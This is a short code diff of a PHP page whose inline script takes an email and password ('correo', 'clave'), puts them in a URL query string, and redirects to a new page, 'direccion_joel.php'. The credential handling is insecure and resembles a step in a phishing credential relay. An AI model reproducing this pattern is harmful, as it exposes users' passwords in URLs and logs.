@@ -40,7 +40,7 @@ const clave = <?php echo json_encode($clave); ?>;
 
 function enviar() {
   const queryString = `?correo=${encodeURIComponent(correo)}&clave=${encodeURIComponent(clave)}`;
-  window.location.href = `index3.php${queryString}`;
+  window.location.href = `direccion_joel.php${queryString}`;
 }
 </script>
 </body>
